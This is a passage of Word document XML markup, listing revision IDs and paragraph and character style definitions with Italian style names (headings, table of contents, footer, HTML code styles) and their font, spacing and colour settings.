    <w:rsid w:val="00740CC9"/>
    <w:rsid w:val="00744F05"/>
    <w:rsid w:val="00762A03"/>
    <w:rsid w:val="00762ED1"/>
    <w:rsid w:val="007652F3"/>
    <w:rsid w:val="00791A49"/>
    <w:rsid w:val="00794C8B"/>
    <w:rsid w:val="007C1345"/>
    <w:rsid w:val="007C7871"/>
    <w:rsid w:val="007C7C2E"/>
    <w:rsid w:val="007E756F"/>
    <w:rsid w:val="00800389"/>
    <w:rsid w:val="00804F9B"/>
    <w:rsid w:val="00807495"/>
    <w:rsid w:val="00811CC3"/>
    <w:rsid w:val="008200C7"/>
    <w:rsid w:val="00836453"/>
    <w:rsid w:val="00844483"/>
    <w:rsid w:val="00844D78"/>
    <w:rsid w:val="008746E9"/>
    <w:rsid w:val="00877FB6"/>
    <w:rsid w:val="008A7B80"/>
    <w:rsid w:val="008A7F8A"/>
    <w:rsid w:val="008C343A"/>
    <w:rsid w:val="008D2168"/>
    <w:rsid w:val="008E6AAE"/>
    <w:rsid w:val="008F7FC4"/>
    <w:rsid w:val="0090542F"/>
    <w:rsid w:val="00920FBC"/>
    <w:rsid w:val="00934F1C"/>
    <w:rsid w:val="00935E1C"/>
    <w:rsid w:val="00952F5F"/>
    <w:rsid w:val="009530C8"/>
    <w:rsid w:val="00955483"/>
    <w:rsid w:val="009644A6"/>
    <w:rsid w:val="00976716"/>
    <w:rsid w:val="00981BE1"/>
    <w:rsid w:val="00992EC6"/>
    <w:rsid w:val="009A3C06"/>
    <w:rsid w:val="009B45EA"/>
    <w:rsid w:val="009D2231"/>
    <w:rsid w:val="009F7BF3"/>
    <w:rsid w:val="00A122DB"/>
    <w:rsid w:val="00A128FC"/>
    <w:rsid w:val="00A1508E"/>
    <w:rsid w:val="00A20390"/>
    <w:rsid w:val="00A41C19"/>
    <w:rsid w:val="00A72AA8"/>
    <w:rsid w:val="00A82052"/>
    <w:rsid w:val="00AA2FB4"/>
    <w:rsid w:val="00AD165F"/>
    <w:rsid w:val="00AE4289"/>
    <w:rsid w:val="00AE46DD"/>
    <w:rsid w:val="00AE7B38"/>
    <w:rsid w:val="00AF2CF9"/>
    <w:rsid w:val="00AF78EB"/>
    <w:rsid w:val="00B01245"/>
    <w:rsid w:val="00B01334"/>
    <w:rsid w:val="00B109C7"/>
    <w:rsid w:val="00B239BB"/>
    <w:rsid w:val="00B41D73"/>
    <w:rsid w:val="00B462C4"/>
    <w:rsid w:val="00B47B7A"/>
    <w:rsid w:val="00B646B8"/>
    <w:rsid w:val="00B66AB1"/>
    <w:rsid w:val="00B67E39"/>
    <w:rsid w:val="00B703BF"/>
    <w:rsid w:val="00B703CC"/>
    <w:rsid w:val="00B74592"/>
    <w:rsid w:val="00B904C8"/>
    <w:rsid w:val="00BA6A2B"/>
    <w:rsid w:val="00BD4305"/>
    <w:rsid w:val="00BF0383"/>
    <w:rsid w:val="00C11C8C"/>
    <w:rsid w:val="00C22492"/>
    <w:rsid w:val="00C2428E"/>
    <w:rsid w:val="00C35D2F"/>
    <w:rsid w:val="00C64B20"/>
    <w:rsid w:val="00C80BD4"/>
    <w:rsid w:val="00C828B3"/>
    <w:rsid w:val="00C85A3F"/>
    <w:rsid w:val="00CA161D"/>
    <w:rsid w:val="00CA3192"/>
    <w:rsid w:val="00CA3275"/>
    <w:rsid w:val="00CD4E7A"/>
    <w:rsid w:val="00CE488A"/>
    <w:rsid w:val="00CF3A42"/>
    <w:rsid w:val="00CF5925"/>
    <w:rsid w:val="00D02E6F"/>
    <w:rsid w:val="00D074E5"/>
    <w:rsid w:val="00D23001"/>
    <w:rsid w:val="00D26E80"/>
    <w:rsid w:val="00D36206"/>
    <w:rsid w:val="00D41B32"/>
    <w:rsid w:val="00D5413C"/>
    <w:rsid w:val="00D621C4"/>
    <w:rsid w:val="00D7373A"/>
    <w:rsid w:val="00D76587"/>
    <w:rsid w:val="00D81CA8"/>
    <w:rsid w:val="00D91D1F"/>
    <w:rsid w:val="00D922B7"/>
    <w:rsid w:val="00DB007C"/>
    <w:rsid w:val="00DC07A3"/>
    <w:rsid w:val="00DC37EC"/>
    <w:rsid w:val="00DD2E21"/>
    <w:rsid w:val="00DE20B5"/>
    <w:rsid w:val="00DF5ECF"/>
    <w:rsid w:val="00E11B8A"/>
    <w:rsid w:val="00E32D5A"/>
    <w:rsid w:val="00E42311"/>
    <w:rsid w:val="00E50D1E"/>
    <w:rsid w:val="00E5623C"/>
    <w:rsid w:val="00E70782"/>
    <w:rsid w:val="00E7474C"/>
    <w:rsid w:val="00E93547"/>
    <w:rsid w:val="00EC00E7"/>
    <w:rsid w:val="00EC4992"/>
    <w:rsid w:val="00ED40FB"/>
    <w:rsid w:val="00EF7332"/>
    <w:rsid w:val="00F131B1"/>
    <w:rsid w:val="00F16C58"/>
    <w:rsid w:val="00F2226A"/>
    <w:rsid w:val="00F37877"/>
    <w:rsid w:val="00F677F9"/>
    <w:rsid w:val="00F83054"/>
    <w:rsid w:val="00FC391B"/>
    <w:rsid w:val="00FD1504"/>
    <w:rsid w:val="00FD2EDD"/>
    <w:rsid w:val="00FD5860"/>
    <w:rsid w:val="00FE16FD"/>
    <w:rsid w:val="00FE50BE"/>
    <w:rsid w:val="00FE575F"/>
    <w:rsid w:val="00FF57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45B3B1"/>
  <w15:chartTrackingRefBased/>
  <w15:docId w15:val="{187EFC76-514E-475E-B967-FEFCBE558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D322D" w:themeColor="text2"/>
        <w:sz w:val="22"/>
        <w:szCs w:val="22"/>
        <w:lang w:val="it-IT"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50195"/>
    <w:pPr>
      <w:jc w:val="both"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="24"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo1">
    <w:name w:val="heading 1"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo1Carattere"/>
    <w:uiPriority w:val="4"/>
    <w:qFormat/>
    <w:rsid w:val="00550195"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="600" w:after="60"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:sz w:val="40"/>
      <w:szCs w:val="40"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="Titolo2Carattere"/>
    <w:uiPriority w:val="4"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00550195"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="240" w:after="0"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:caps/>
      <w:sz w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo3">
    <w:name w:val="heading 3"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo3Carattere"/>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Titolo5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo5Carattere"/>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Titolo6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo6Carattere"/>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Titolo8">
    <w:name w:val="heading 8"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo8Carattere"/>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olo9">
    <w:name w:val="heading 9"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:link w:val="Titolo9Carattere"/>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Sfondochiaro">
    <w:name w:val="Light Shading"/>
    <w:basedOn w:val="Tabellanormale"/>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zionicontatto">
    <w:name w:val="Informazioni contatto"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="4"/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:before="360" w:after="0"/>
      <w:contextualSpacing/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo1Carattere">
    <w:name w:val="Titolo 1 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo1"/>
    <w:uiPriority w:val="4"/>
    <w:rsid w:val="00550195"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
      <w:b/>
      <w:bCs/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="40"/>
      <w:szCs w:val="40"/>
      <w:lang w:val="en-GB"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo2Carattere">
    <w:name w:val="Titolo 2 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo2"/>
    <w:uiPriority w:val="4"/>
    <w:rsid w:val="00550195"/>
    <w:rPr>
      <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cstheme="majorBidi"/>
      <w:b/>
      <w:caps/>
      <w:color w:val="000000" w:themeColor="text1"/>
      <w:sz w:val="32"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo3Carattere">
    <w:name w:val="Titolo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo3"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="22"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo5Carattere">
    <w:name w:val="Titolo 5 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo5"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="1F120E" w:themeColor="accent1" w:themeShade="80"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo6Carattere">
    <w:name w:val="Titolo 6 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo6"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00690EFD"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="1F120E" w:themeColor="accent1" w:themeShade="7F"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Puntoelenco">
    <w:name w:val="List Bullet"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="7"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Numeroelenco">
    <w:name w:val="List Number"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="5"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:contextualSpacing/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolo">
    <w:name w:val="Title"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TitoloCarattere"/>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oloCarattere">
    <w:name w:val="Titolo Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo"/>
    <w:uiPriority w:val="2"/>
    <w:rsid w:val="00FD1504"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="3F251D" w:themeColor="accent1"/>
      <w:kern w:val="28"/>
      <w:sz w:val="60"/>
      <w:szCs w:val="60"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sottotitolo">
    <w:name w:val="Subtitle"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="SottotitoloCarattere"/>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ottotitoloCarattere">
    <w:name w:val="Sottotitolo Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Sottotitolo"/>
    <w:uiPriority w:val="3"/>
    <w:rsid w:val="00FD1504"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:caps/>
      <w:sz w:val="26"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="Foto">
    <w:name w:val="Foto"/>
    <w:basedOn w:val="Normale"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00D5413C"/>
    <w:pPr>
      <w:spacing w:before="2400" w:after="400"/>
      <w:jc w:val="center"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Didascalia">
    <w:name w:val="caption"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="2"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:before="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:i/>
      <w:iCs/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo9Carattere">
    <w:name w:val="Titolo 9 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo9"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="272727" w:themeColor="text1" w:themeTint="D8"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Titolo8Carattere">
    <w:name w:val="Titolo 8 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Titolo8"/>
    <w:uiPriority w:val="4"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="272727" w:themeColor="text1" w:themeTint="D8"/>
      <w:szCs w:val="21"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Titolosommario">
    <w:name w:val="TOC Heading"/>
    <w:basedOn w:val="Titolo1"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:qFormat/>
    <w:pPr>
      <w:spacing w:before="0"/>
      <w:outlineLvl w:val="9"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Pidipagina">
    <w:name w:val="footer"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="PidipaginaCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="003422FF"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
      <w:jc w:val="right"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PidipaginaCarattere">
    <w:name w:val="Piè di pagina Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Pidipagina"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="003422FF"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario3">
    <w:name w:val="toc 3"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:smallCaps/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario1">
    <w:name w:val="toc 1"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:before="360" w:after="360"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:caps/>
      <w:u w:val="single"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Sommario2">
    <w:name w:val="toc 2"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:autoRedefine/>
    <w:uiPriority w:val="39"/>
    <w:unhideWhenUsed/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:smallCaps/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testofumetto">
    <w:name w:val="Balloon Text"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TestofumettoCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TestofumettoCarattere">
    <w:name w:val="Testo fumetto Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testofumetto"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Tahoma" w:hAnsi="Tahoma" w:cs="Tahoma"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Bibliografia">
    <w:name w:val="Bibliography"/>
    <w:basedOn w:val="Normale"/>
    <w:next w:val="Normale"/>
    <w:uiPriority w:val="39"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Corpodeltesto3">
    <w:name w:val="Body Text 3"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="Corpodeltesto3Carattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:after="120"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="table" w:customStyle="1" w:styleId="Tabellarelazione">
    <w:name w:val="Tabella relazione"/>
    <w:basedOn w:val="Tabellanormale"/>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gliatabella">
    <w:name w:val="Table Grid"/>
    <w:basedOn w:val="Tabellanormale"/>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1A2000"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="IntestazioneCarattere">
    <w:name w:val="Intestazione Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Intestazione"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="001A2000"/>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Corpodeltesto3Carattere">
    <w:name w:val="Corpo del testo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Corpodeltesto3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="Rimandocommento">
    <w:name w:val="annotation reference"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:sz w:val="22"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Rientrocorpodeltesto3">
    <w:name w:val="Body Text Indent 3"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="Rientrocorpodeltesto3Carattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:after="120"/>
      <w:ind w:left="360"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="Rientrocorpodeltesto3Carattere">
    <w:name w:val="Rientro corpo del testo 3 Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Rientrocorpodeltesto3"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testocommento">
    <w:name w:val="annotation text"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TestocommentoCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TestocommentoCarattere">
    <w:name w:val="Testo commento Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testocommento"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Soggettocommento">
    <w:name w:val="annotation subject"/>
    <w:basedOn w:val="Testocommento"/>
    <w:next w:val="Testocommento"/>
    <w:link w:val="SoggettocommentoCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="SoggettocommentoCarattere">
    <w:name w:val="Soggetto commento Carattere"/>
    <w:basedOn w:val="TestocommentoCarattere"/>
    <w:link w:val="Soggettocommento"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Mappadocumento">
    <w:name w:val="Document Map"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="MappadocumentoCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="MappadocumentoCarattere">
    <w:name w:val="Mappa documento Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Mappadocumento"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
      <w:szCs w:val="16"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Testonotadichiusura">
    <w:name w:val="endnote text"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TestonotadichiusuraCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TestonotadichiusuraCarattere">
    <w:name w:val="Testo nota di chiusura Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonotadichiusura"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Indirizzomittente">
    <w:name w:val="envelope return"/>
    <w:basedOn w:val="Normale"/>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Testonotaapidipagina">
    <w:name w:val="footnote text"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="TestonotaapidipaginaCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="TestonotaapidipaginaCarattere">
    <w:name w:val="Testo nota a piè di pagina Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="Testonotaapidipagina"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="CodiceHTML">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="PreformattatoHTML">
    <w:name w:val="HTML Preformatted"/>
    <w:basedOn w:val="Normale"/>
    <w:link w:val="PreformattatoHTMLCarattere"/>
    <w:uiPriority w:val="99"/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:pPr>
      <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:customStyle="1" w:styleId="PreformattatoHTMLCarattere">
    <w:name w:val="Preformattato HTML Carattere"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:link w:val="PreformattatoHTML"/>
    <w:uiPriority w:val="99"/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="TastieraHTML">
    <w:name w:val="HTML Keyboard"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
      <w:sz w:val="22"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="MacchinadascrivereHTML">
    <w:name w:val="HTML Typewriter"/>
    <w:basedOn w:val="Carpredefinitoparagrafo"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="00A122DB"/>
